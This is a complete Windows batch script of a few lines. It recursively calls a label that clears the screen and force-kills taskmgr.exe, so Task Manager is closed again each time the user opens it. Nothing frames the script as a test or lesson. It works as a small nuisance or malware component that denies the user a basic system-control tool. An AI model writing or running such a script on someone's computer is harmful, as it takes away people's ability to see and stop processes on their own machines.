@echo off
:func
cls
taskkill /f /im taskmgr.exe
call:func
goto:eof
call:func